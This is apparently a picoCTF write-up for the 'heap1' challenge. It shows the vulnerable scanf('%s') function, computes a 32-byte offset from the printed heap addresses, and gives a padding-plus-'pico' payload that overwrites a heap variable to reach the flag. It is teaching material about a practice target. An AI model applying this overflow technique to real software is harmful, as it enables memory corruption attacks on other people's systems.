## Analysis
Our goal is to override the `safe_var` global pointers value from `bico` ro `pico`.  
When we launch the program we are presented with a menu
```
$ nc tethys.picoctf.net 62992

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x61f067ded2b0  ->   pico
+-------------+----------------+
[*]   0x61f067ded2d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice:
```

The second option is our target.  
In the source code this maps to the function
```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

it uses`scanf()` to read the input which allows buffer overflows.  
So we can overflow `input_data` to override `safe_var`.  

Instead  of blindly trying different sizes of inputs, we can calculate exactly the size
```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x61f067ded2b0  ->   pico
+-------------+----------------+
[*]   0x61f067ded2d0  ->   bico
+-------------+----------------+
```

The program gives us the current state of the heap.  
The first line is the input location and the second one `safe_var`.  
So our input is 0x61f067ded2d0 - 0x61f067ded2b0 = 0x20 = 32 bytes away from our target.

So our payload will be 32 random bytes followed by `pico` and then select option 4
## Solution

- Select option 2 to write to the buffer
- Enter `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico`

### Execution Example:

Take a look at my variable: safe_var = pico
